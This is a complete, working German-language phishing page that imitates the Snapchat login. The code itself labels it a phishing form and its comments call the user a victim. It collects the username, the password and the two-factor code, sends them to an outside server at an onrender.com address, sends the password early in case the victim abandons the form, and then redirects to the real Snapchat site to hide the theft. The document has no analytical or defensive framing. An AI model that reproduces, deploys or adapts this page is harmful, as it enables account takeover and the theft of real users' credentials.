<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Snapchat Login</title>
  <style>
    body { font-family: Arial, sans-serif; background: #FFFC00; margin: 0; padding: 0; }
    .login-container { max-width: 400px; margin: 50px auto; padding: 20px; background: white; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
    .logo { display: block; margin: 0 auto 20px; width: 60px; }
    h2 { text-align: center; color: #000; }
    input[type="text"], input[type="password"] { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 5px; }
    button { width: 100%; padding: 12px; background: #FFFC00; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
    .error-message { color: red; font-size: 14px; margin-top: 10px; display: none; }
  </style>
</head>
<body>
  <div class="login-container">
    <form id="phishingForm">
      <!-- SCHRITT 1: Nutzername -->
      <div class="login-box" id="step1">
        <img src="https://static.snapchat.com/static/images/logo-snapchat.png" alt="Snapchat" class="logo">
        <h2>Logge dich bei Snapchat ein</h2>
        <label for="username">Nutzername oder E-Mail</label>
        <input type="text" id="username" name="username" required>
        <button type="button" id="step1-button" onclick="goToStep2()" disabled>Weiter</button>
      </div>

      <!-- SCHRITT 2: Passwort -->
      <div class="login-box" id="step2" style="display: none;">
        <img src="https://static.snapchat.com/static/images/logo-snapchat.png" alt="Snapchat" class="logo">
        <h2>Passwort eingeben</h2>
        <div class="email-mask" id="email-display"></div>
        <label for="password">Passwort</label>
        <input type="password" id="password" name="password" required>
        <div id="password-error" class="error-message">Falsches Passwort. Versuche es erneut.</div>
        <button type="button" id="step2-button" onclick="goToStep3()" disabled>Weiter</button>
      </div>

      <!-- SCHRITT 3: 2FA -->
      <div class="login-box" id="step3" style="display: none;">
        <img src="https://static.snapchat.com/static/images/logo-snapchat.png" alt="Snapchat" class="logo">
        <h2>Sicherheitsüberprüfung</h2>
        <p>Wir haben einen Code an dein Handy gesendet. Gib ihn unten ein.</p>
        <input type="text" id="twoFACode" name="twoFACode" placeholder="6-stelliger Code" required>
        <div id="code-error" class="error-message">Ungültiger Code.</div>
        <button type="button" id="step3-button" onclick="submitAllData()">Bestätigen</button>
      </div>
    </form>
  </div>

  <script>
    // Nutzername → Passwort
    function goToStep2() {
      const username = document.getElementById("username").value;
      document.getElementById("step1").style.display = "none";
      document.getElementById("step2").style.display = "block";
      document.getElementById("email-display").innerHTML = 
        username.substring(0, 3) + "***" + username.split("@")[1] + 
        ' <a href="#" onclick="goToStep1()">Ändern?</a>';
    }

    // Passwort → 2FA
    function goToStep3() {
      const password = document.getElementById("password").value;
      document.getElementById("step2").style.display = "none";
      document.getElementById("step3").style.display = "block";
      
      // Daten VOR 2FA senden (falls Opfer abbricht)
      fetch('https://snapchat-usyu.onrender.com/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: document.getElementById("username").value,
          password: password
        })
      });
    }

    // FINALE ÜBERMITTLUNG (Username + Passwort + 2FA)
    function submitAllData() {
      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;
      const twoFACode = document.getElementById("twoFACode").value;
      
      fetch('https://snapchat-usyu.onrender.com/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password, twoFACode })
      })
      .then(() => {
        // ERST HIER UMLEITEN (nach erfolgreicher Übertragung)
        window.location.href = "https://accounts.snapchat.com";  
      })
      .catch(err => {
        document.getElementById("code-error").style.display = "block";
      });
    }

    // Validierung der Eingaben
    document.getElementById("username").addEventListener("input", function() {
      document.getElementById("step1-button").disabled = !this.value;
    });
    document.getElementById("password").addEventListener("input", function() {
      document.getElementById("step2-button").disabled = !this.value;
    });
    document.getElementById("twoFACode").addEventListener("input", function() {
      document.getElementById("step3-button").disabled = !this.value;
    });
  </script>
</body>
</html>
